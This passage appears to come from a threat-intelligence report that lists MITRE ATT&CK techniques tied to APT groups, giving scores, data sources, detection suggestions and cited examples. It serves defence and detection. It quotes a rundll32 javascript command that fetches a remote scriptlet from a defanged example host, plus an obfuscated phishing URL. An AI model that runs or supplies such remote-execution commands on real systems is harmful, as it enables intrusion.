- Volt Typhoon has gained initial access through exploitation of multiple vulnerabilities in internet-facing software and appliances such as Fortinet, Ivanti (formerly Pulse Secure), NETGEAR, Citrix, and Cisco.[[5]](https://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations)[[6]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [System Binary Proxy Execution: Rundll32 (T1218.011)](https://attack.mitre.org/techniques/T1218/011)
#### Score: 15
#### Description:
Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).

Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)

Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).

Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) 
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Process: Process Creation
- Command: Command Execution
- File: File Metadata
- Module: Module Load
### Detection Suggestions:
Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.

Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.
#### Examples: 
- APT28 executed CHOPSTICK by using rundll32 commands such as rundll32.exe "C:\Windows\twain_64.dll". APT28 also executed a .dll for a first stage dropper using rundll32.exe. An APT28 loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.[[1]](https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/)[[2]](https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf)[[3]](https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/)[[4]](https://pan-unit42.github.io/playbook_viewer/)[[5]](https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/)[[6]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- Lazarus Group has used rundll32 to execute malicious payloads on a compromised host.[[7]](https://x.com/ESETresearch/status/1458438155149922312)
### [Use Alternate Authentication Material: Pass the Hash (T1550.002)](https://attack.mitre.org/techniques/T1550/002)
#### Score: 15
#### Description:
Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

Adversaries may also use stolen password hashes to "overpass the hash." Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Logon Session: Logon Session Creation
- Active Directory: Active Directory Credential Request
- User Account: User Account Authentication
### Detection Suggestions:
Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.

Event ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.(Citation: Stealthbits Overpass-the-Hash)
#### Examples: 
- APT28 has used pass the hash for lateral movement.[[1]](http://download.microsoft.com/download/4/4/C/44CDEF0E-7924-4787-A56A-16261691ACE3/Microsoft_Security_Intelligence_Report_Volume_19_English.pdf)
### [Archive Collected Data: Archive via Utility (T1560.001)](https://attack.mitre.org/techniques/T1560/001)
#### Score: 15
#### Description:
Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.

Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. 

On Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. 

Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Process: Process Creation
- Command: Command Execution
- File: File Creation
### Detection Suggestions:
Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.

Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)
#### Examples: 
- APT28 has used a variety of utilities, including WinRAR, to archive collected data with password protection.[[1]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- APT33 has used WinRAR to compress data prior to exfil.[[2]](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage)
- menuPass has compressed files before exfiltration using TAR and RAR.[[3]](https://web.archive.org/web/20220224041316/https:/www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)[[4]](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf)[[5]](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)
- Volt Typhoon has archived the ntds.dit database as a multi-volume password-protected archive with 7-Zip.[[6]](https://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations)[[7]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Remote Services: SMB/Windows Admin Shares (T1021.002)](https://attack.mitre.org/techniques/T1021/002)
#### Score: 15
#### Description:
Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.

Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Network Share: Network Share Access
- Network Traffic: Network Traffic Flow
- Logon Session: Logon Session Creation
- Network Traffic: Network Connection Creation
- Process: Process Creation
- Command: Command Execution
### Detection Suggestions:
Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding. (Citation: Lateral Movement Payne)(Citation: Windows Event Forwarding Payne) Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [Net](https://attack.mitre.org/software/S0039), on the command-line interface and Discovery techniques that could be used to find remotely accessible systems.(Citation: Medium Detecting WMI Persistence)
#### Examples: 
- APT28 has mapped network drives using Net and administrator credentials.[[1]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- Lazarus Group malware SierraAlfa accesses the ADMIN$ share via SMB to conduct lateral movement.[[2]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)[[3]](https://web.archive.org/web/20220608001455/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-RAT-and-Staging-Report.pdf)
### [Active Scanning: Vulnerability Scanning (T1595.002)](https://attack.mitre.org/techniques/T1595/002)
#### Score: 15
#### Description:
Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.

These scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Network Traffic: Network Traffic Content
- Network Traffic: Network Traffic Flow
### Detection Suggestions:
Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.
#### Examples: 
- APT28 has performed large-scale scans in an attempt to find vulnerable servers.[[1]](https://documents.trendmicro.com/assets/white_papers/wp-pawn-storm-in-2019.pdf)
### [File and Directory Discovery (T1083)](https://attack.mitre.org/techniques/T1083)
#### Score: 15
#### Description:
Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Many command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)

Some files and directories may require elevated or specific user permissions to access.
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Command: Command Execution
- Process: Process Creation
- Process: OS API Execution
### Detection Suggestions:
System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather file and directory information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use of commands being run by non-standard users from non-standard locations.  
#### Examples: 
- APT28 has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.[[1]](https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/)[[2]](https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf)
- Lazarus Group malware can use a common function to identify target files by their extension, and some also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.[[3]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)[[4]](https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/)[[5]](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)[[6]](https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns)
- menuPass has searched compromised systems for folders of interest including those related to HR, audit and expense, and meeting memos.[[7]](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)
- Volt Typhoon has enumerated directories containing vulnerability testing and cyber related content and facilities data such as construction drawings.[[8]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Data Staged: Local Data Staging (T1074.001)](https://attack.mitre.org/techniques/T1074/001)
#### Score: 15
#### Description:
Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.

Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- File: File Creation
- Windows Registry: Windows Registry Key Modification
- File: File Access
- Command: Command Execution
### Detection Suggestions:
Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.

Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

Consider monitoring accesses and modifications to local storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection.
#### Examples: 
- APT28 has stored captured credential information in a file named pi.log.[[1]](http://download.microsoft.com/download/4/4/C/44CDEF0E-7924-4787-A56A-16261691ACE3/Microsoft_Security_Intelligence_Report_Volume_19_English.pdf)
- Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server.[[2]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)[[3]](https://web.archive.org/web/20190508165631/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Loaders-Installers-and-Uninstallers-Report.pdf)
- menuPass stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin.[[4]](https://web.archive.org/web/20220224041316/https:/www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)
- Volt Typhoon has saved stolen files including the ntds.dit database and the SYSTEM and SECURITY Registry hives locally to the C:\Windows\Temp\ directory.[[5]](https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF)[[6]](https://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations)
### [System Network Connections Discovery (T1049)](https://attack.mitre.org/techniques/T1049)
#### Score: 15
#### Description:
Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. 

An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.

Utilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), "net use," and "net session" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to "net session". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, the command `esxi network ip connection list` can be used to list active network connections.(Citation: Sygnia ESXi Ransomware 2025)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Process: OS API Execution
- Process: Process Creation
- Command: Command Execution
### Detection Suggestions:
System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather system and network information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use commands being run by non-standard users from non-standard locations. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
#### Examples: 
- Lazarus Group has used net use to identify and establish a network connection with a remote host.[[1]](https://securelist.com/lazarus-threatneedle/100803/)
- menuPass has used net use to conduct connectivity checks to machines.[[2]](https://web.archive.org/web/20220224041316/https:/www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)
- Volt Typhoon has used netstat -ano on compromised hosts to enumerate network connections.[[3]](https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF)[[4]](https://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations)
### [Compromise Accounts: Email Accounts (T1586.002)](https://attack.mitre.org/techniques/T1586/002)
#### Score: 15
#### Description:
Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).

A variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or [Phishing](https://attack.mitre.org/techniques/T1566) emails may evade reputation-based email filtering rules.

Adversaries can use a compromised email account to hijack existing email threads with targets of interest.
#### Raleigh Space Systems Analysis: 
### Detection Suggestions:
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).
#### Examples: 
- APT28 has used compromised email accounts to send credential phishing emails.[[1]](https://blog.google/threat-analysis-group/update-threat-landscape-ukraine)
### [Web Service: Bidirectional Communication (T1102.002)](https://attack.mitre.org/techniques/T1102/002)
#### Score: 15
#### Description:
Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. 

Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. 
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Network Traffic: Network Traffic Content
- Network Traffic: Network Connection Creation
- Network Traffic: Network Traffic Flow
### Detection Suggestions:
Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)
#### Examples: 
- APT28 has used Google Drive for C2.[[1]](https://www.trendmicro.com/en_us/research/20/l/pawn-storm-lack-of-sophistication-as-a-strategy.html)
- APT37 leverages social networking sites and cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, and Box) for C2.[[2]](https://services.google.com/fh/files/misc/apt37-reaper-the-overlooked-north-korean-actor.pdf)[[3]](https://blog.talosintelligence.com/2018/01/korea-in-crosshairs.html)
- Lazarus Group has used GitHub as C2, pulling hosted image payloads then committing command execution output to files in specific directories.[[4]](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)
### [Trusted Relationship (T1199)](https://attack.mitre.org/techniques/T1199)
#### Score: 15
#### Description:
Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.

Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)

In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Logon Session: Logon Session Creation
- Logon Session: Logon Session Metadata
- Network Traffic: Network Traffic Content
- Application Log: Application Log Content
### Detection Suggestions:
Establish monitoring for activity conducted by second and third party providers and other trusted entities that may be leveraged as a means to gain access to the network. Depending on the type of relationship, an adversary may have access to significant amounts of information about the target before conducting an operation, especially if the trusted relationship is based on IT services. Adversaries may be able to act quickly towards an objective, so proper monitoring for behavior related to Credential Access, Lateral Movement, and Collection will be important to detect the intrusion.
#### Examples: 
- Once APT28 gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.[[1]](https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf)
- menuPass has used legitimate access granted to Managed Service Providers in order to access victims of interest.[[2]](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf)[[3]](https://www.fireeye.com/blog/threat-research/2017/04/apt10_menupass_grou.html)[[4]](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)[[5]](https://www.justice.gov/opa/pr/two-chinese-hackers-associated-ministry-state-security-charged-global-computer-intrusion)[[6]](https://www.justice.gov/opa/page/file/1122671/download)
### [Phishing: Spearphishing Link (T1566.002)](https://attack.mitre.org/techniques/T1566/002)
#### Score: 15
#### Description:
Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.

Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an "IDN homograph attack").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)

Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)

Adversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured through “consent phishing” into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)

Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as “device code phishing,” an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Network Traffic: Network Traffic Flow
- Application Log: Application Log Content
- Network Traffic: Network Traffic Content
### Detection Suggestions:
URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites as well as links redirecting to adversary infrastructure based by upon suspicious OAuth patterns with unusual TLDs.(Citation: Microsoft OAuth 2.0 Consent Phishing 2021). Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.

Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)

Because this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.
#### Examples: 
- APT33 has sent spearphishing emails containing links to .hta files.[[1]](https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html)[[2]](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage)
- Lazarus Group has sent malicious links to victims via email.[[3]](https://securelist.com/lazarus-threatneedle/100803/)
